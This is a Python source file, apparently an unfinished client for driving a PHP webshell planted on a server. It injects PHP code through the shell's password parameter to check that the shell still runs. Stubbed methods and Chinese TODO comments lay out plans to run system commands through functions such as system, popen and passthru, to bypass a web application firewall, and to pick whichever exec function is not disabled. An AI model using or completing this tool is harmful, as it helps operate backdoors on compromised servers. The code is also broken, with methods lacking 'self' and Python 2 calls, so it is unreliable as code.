#!/usr/bin/env python
# encoding: utf-8

from random_string import random_string
from http.build_url import build_url
import requests
import string
import Log

class WebShell():
    url = "http://127.0.0.1/c.php"
    method = "POST"
    password = "c"
    working = False
    def __init__(self, url, method, password):
        self.url = url
        self.method = method
        self.password = password
        self.working = self.init(self.url, self.method, self.password)

    def check_working(url, method, auth):
        Log.info("Checking whether the webshell is still work...")
        key = random_string(6, string.letters)
        value = random_string(32, string.letters)
        Log.info("Using challenge key : [%s] , value : [%s]" % (key, value))
        method = string.upper(method)
        if method == "POST" or method == "REQUEST":
            Log.info("Using POST method...")
            data = {auth:'var_dump("$_POST[%s]");' % (key), key:value}
            response = requests.post(url, data=data)
        elif method == "GET":
            Log.info("Using GET method...")
            params = {auth:'var_dump("$_POST[%s]");' % key}
            url = build_url(url, params)
            data = {key:value}
            response = requests.post(url, data=data)
        else:
            Log.error("Unsupported method!")
            return False
        content = response.content
        return value in content

    def check_connection(url):
        try:
            response = requests.head(url)
            return (True, "The status code is %d" % (response.status_code))
        except:
            return (False,"Connection error!")

    def init(self, url, method, password):
        connection = self.check_connection(url)
        if connection[0]:
            Log.success(connection[1])
            self.working = True
        else:
            Log.error(connection[1])
            self.working = False
            return
        if self.check_working(url, method, password):
            Log.success("It works!")
            self.working = True
        else:
            Log.error("It died!")
            self.working = False
            return


    def function_call(function_name, args):
        # TODO 函数调用 , 可以使用类似回调函数这样的调用方式来绕过WAF
        pass

    def php_code_exec(code):
        pass

    def check_function_enable(function_name):
        # TODO
        pass

    def auto_exec(commad):
        # TODO 根据当前环境 , 结合被禁用的函数 , 自动判断使用哪个函数进行命令执行
        pass

    def php_shell_exec(command):
        # TODO
        pass

    def php_system(command):
        # TODO
        pass

    def php_popen(command):
        # TODO
        pass

    def php_proc_open(command):
        # TODO
        pass

    def php_exec(command):
        # TODO
        pass

    def php_passthru(command):
        # TODO
        pass
